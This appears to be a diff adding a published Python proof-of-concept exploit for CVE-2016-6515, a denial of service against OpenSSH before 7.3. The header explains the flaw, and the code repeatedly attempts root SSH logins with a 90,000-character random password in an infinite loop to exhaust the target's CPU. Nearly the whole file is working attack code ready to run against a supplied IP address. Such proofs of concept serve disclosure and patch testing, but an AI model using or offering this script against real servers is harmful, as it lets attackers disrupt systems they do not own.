@@ -1,0 +1,78 @@
+################################################################################
+# Title		: OpenSSH before 7.3 Crypt CPU Consumption (DoS Vulnerability)
+# Author	: Kashinath T (tkashinath@secpod.com) (www.secpod.com)
+# Vendor	: http://www.openssh.com/
+# Software	: http://www.openssh.com/
+# Version	: OpenSSH before 7.3
+# Tested on	: Ubuntu 16.04 LTS, Centos 7
+# CVE 		: CVE-2016-6515
+# Date		: 20-10-2016
+#
+# NOTE:
+# If the remote machine is installed and running OpenSSH version prior to 7.3,
+# it does not limit the password length for authentication. Hence, to exploit
+# this vulnerability' we will send a crafted data which is of 90000 characters
+# in length to the 'password' field while attempting to log in to a remote
+# machine via ssh with username as 'root'.
+#
+# For more info refer,
+# http://www.secpod.com/blog/openssh-crypt-cpu-consumption
+################################################################################
+
+import sys
+from random import choice
+from string import lowercase
+
+try:
+    import paramiko
+except ImportError:
+    print "[-] python module 'paramiko' is missing, Install paramiko with" \
+          " following command 'sudo pip install paramiko'"
+    sys.exit(0)
+
+
+class ssh_exploit:
+
+    def __init__(self):
+        """
+        Initialise the objects
+        """
+
+    def ssh_login(self, remote_ip):
+
+        try:
+            # Crafted password of length 90000
+            passwd_len = 90000
+            crafted_passwd = "".join(choice(lowercase)
+                                     for i in range(passwd_len))
+
+            # Connect to a remote machine via ssh
+            ssh = paramiko.SSHClient()
+            ssh.load_system_host_keys()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+            # calling connect in infinite loop
+            print "[+] Entering infinite loop"
+            while 1:
+                ssh.connect(remote_ip, username='root',
+                            password=crafted_passwd)
+
+        except Exception, msg:
+            print "Error in connecting to remote host : ", remote_ip
+            print "Exception in : ssh_login method."
+            sys.exit(msg)
+
+
+def main():
+
+    if len(sys.argv) != 2:
+        print "usage: python openssh_crypt_cpu_consumption_dos.py 192.168.x.x"
+        sys.exit()
+
+    # Calling ssh_connect
+    ref_obj = ssh_exploit()
+    ref_obj.ssh_login(sys.argv[1])
+
+
+if __name__ == "__main__":
+    main()
